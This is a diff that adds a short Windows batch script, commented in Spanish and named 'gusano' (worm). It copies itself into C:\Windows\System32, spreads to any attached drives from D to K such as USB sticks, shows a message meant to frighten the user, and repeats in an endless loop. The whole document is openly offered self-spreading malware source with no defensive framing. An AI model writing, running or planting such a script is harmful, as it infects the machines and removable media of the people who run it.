@@ -1,0 +1,16 @@
+@echo off
+:inicio
+REM Copiarse a una ubicación específica
+copy %0 C:\Windows\System32\gusano.bat
+
+REM Infectar unidades externas (como USBs)
+for %%i in (D E F G H I J K) do if exist %%i:\ (
+    copy %0 %%i:\gusano.bat
+)
+
+REM Mostrar un mensaje para confundir al usuario
+echo Tu sistema está en peligro...
+timeout /t 5 >nul
+
+REM Repetir el proceso infinitamente
+goto inicio
